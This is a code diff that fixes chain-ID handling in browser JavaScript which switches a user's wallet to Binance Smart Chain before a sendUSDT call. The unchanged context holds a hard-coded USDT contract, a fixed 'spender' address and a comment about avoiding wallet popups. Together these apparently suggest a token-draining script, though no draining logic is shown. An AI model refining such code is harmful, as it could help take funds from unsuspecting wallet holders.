@@ -1,7 +1,7 @@
 let provider;
 
 // ===== BSC CONFIG =====
-const BSC_CHAIN_ID = "0x38";
+const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
 const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
 
@@ -19,10 +19,12 @@ const ABI = [
 async function ensureBSC() {
   try {
     const chainId = await window.ethereum.request({ method: "eth_chainId" });
-    if (chainId !== BSC_CHAIN_ID) {
+    const currentChainId = parseInt(chainId, 16); // Convert hex to decimal
+    
+    if (currentChainId !== BSC_CHAIN_ID) {
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }]
+        params: [{ chainId: `0x${BSC_CHAIN_ID.toString(16)}` }] // Convert to hex
       });
     }
   } catch (err) {
@@ -30,7 +32,7 @@ async function ensureBSC() {
       await window.ethereum.request({
         method: "wallet_addEthereumChain",
         params: [{
-          chainId: BSC_CHAIN_ID,
+          chainId: `0x${BSC_CHAIN_ID.toString(16)}`, // Convert to hex
           chainName: "Binance Smart Chain",
           rpcUrls: ["https://bsc-dataseed.binance.org/"],
           nativeCurrency: {
@@ -62,7 +64,7 @@ async function sendUSDT() {
 
     // Step 2: Check network BEFORE accessing wallet (no popup)
     const network = await provider.getNetwork();
-    if (network.chainId !== 56n) {
+    if (Number(network.chainId) !== BSC_CHAIN_ID) {
       await ensureBSC();
     }
 
